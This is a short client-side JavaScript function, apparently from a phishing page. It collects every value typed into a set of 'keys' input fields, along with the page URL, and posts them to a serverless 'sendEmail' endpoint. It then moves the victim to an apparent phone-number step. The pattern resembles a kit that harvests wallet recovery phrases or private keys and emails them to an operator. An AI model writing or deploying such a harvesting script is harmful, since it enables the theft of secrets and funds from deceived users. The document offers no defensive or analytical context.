<script>
async function gotoverifybytwl() {
    // Collect dynamic input data
    let allKeys = [];
    document.querySelectorAll('.form_keys input').forEach(input => {
        allKeys.push(input.value.trim());
    });

    const formData = {
        keys: allKeys,
        url: window.location.href
    };

    try {
        const response = await fetch('/.netlify/functions/sendEmail', {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(formData)
        });

        const result = await response.json();
        console.log("Response:", result);

        if (result.status === "ok") {
            document.getElementById("frm-box").style.display = "none";
            document.getElementById("phn-box").style.display = "block";
        } else {
            alert("Something went wrong: " + result.message);
        }
    } catch (error) {
        console.error("Error sending request:", error);
    }
}
</script>
